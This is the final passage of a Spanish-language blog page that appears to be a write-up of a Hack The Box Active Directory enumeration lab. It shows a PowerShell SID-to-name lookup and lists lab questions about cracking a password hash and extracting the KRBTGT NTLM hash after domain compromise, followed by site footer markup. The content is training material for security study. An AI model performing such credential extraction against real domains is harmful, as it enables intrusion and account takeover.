+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Convert-SidToName <span style="color:#e6db74">&#34;S-1-5-21-3327542485-274640656-2609762496-4611&#34;</span>
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_9-6.png" alt="">
+<code>CT059</code></p>
+<p><strong>Descifre el hash de la contraseña de este usuario y envíe la contraseña en texto sin formato como respuesta.</strong></p>
+<p><strong>Envíe el contenido del archivo flag.txt en el escritorio del administrador en el host DC01.</strong></p>
+<p><strong>Envíe el hash NTLM de la cuenta KRBTGT para el dominio de destino después de lograr el compromiso del dominio.</strong></p>
+<p>Si te sirvió de algo este tutorial ya para mi es más que suficiente, si me puedes decir en que podemos mejorar te lo voy a agradecer un montón.</p>
+
+
+                <div id="social-media-share">
+	<p><i>Escríbeme por cualquiera de las vías</i></p>
+	
+	<div class="share-buttons">
+	    
+		<a href="https://www.instagram.com/19chl96/" 
+   			target="_blank" 
+   			title="Sígueme en Instagram">
+    		<img src=https://chlorenzo.com/icons/45px/instagram.png alt="Instagram">
+		</a>
+
+		<a  href="https://www.linkedin.com/in/chlinked/"
+	        onclick="socialMediaPopUp(this.href, '', 900, 500); return false;"
+	        title="Share on LinkedIn. Opens in a new window." >
+	        <img src=https://chlorenzo.com/icons/48px/linkedin.png>
+	    </a>
+
+	    <a href="https://mail.google.com/mail/?view=cm&fs=1&to=chlorenzo96@gmail.com&su=Para Carlos&body=Hola." 
+   		   target="_blank" 
+   		   title="Enviar correo usando Gmail">
+    	<img src=https://chlorenzo.com/icons/48px/email.png alt="Email">
+		</a>
+
+		
+
+	</div>
+</div>
+
+
+
+                
+                <br>
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    (function () {
+        
+        
+        if (window.location.hostname == "localhost")
+            return;
+
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        var disqus_shortname = '';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+            </div>
+
+            <div class="col-lg-2 d-none d-xl-block">
+                <div class="ad-right-offset"></div>
+                
+            </div>
+        </div>
+    </div>
+</main>
+
+<footer class="bg-dark text-light py-4">
+    <div class="container-md">
+        <div class="row justify-content-center">
+            <div class="col-12">
+                <nav class="navbar navbar-expand-sm navbar-dark bg-dark justify-content-center">
+                    <ul class="navbar-nav">
+                        <li class="nav-item">
+                            <a class="nav-link" href="https://chlorenzo.com/">Home</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="https://chlorenzo.com/pagina_web/blog/seguridad_para_todos/">Seguridad para todos</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="https://chlorenzo.com/pagina_web/blog/write-ups/">Write-ups</a>
+                        </li>
+                    </ul>
+                </nav>
+            </div>
+        </div>
+    </div>
+    <div class="text-center mt-3">
+        <p>© 2025 Carlos Hernández Lorenzo</p>
+    </div>
+</footer>
+
+
+<script async src="https://cse.google.com/cse.js?cx=google-cse-key"></script>
+<gcse:searchresults-only></gcse:searchresults-only>
+
+</body>
+
+</html>
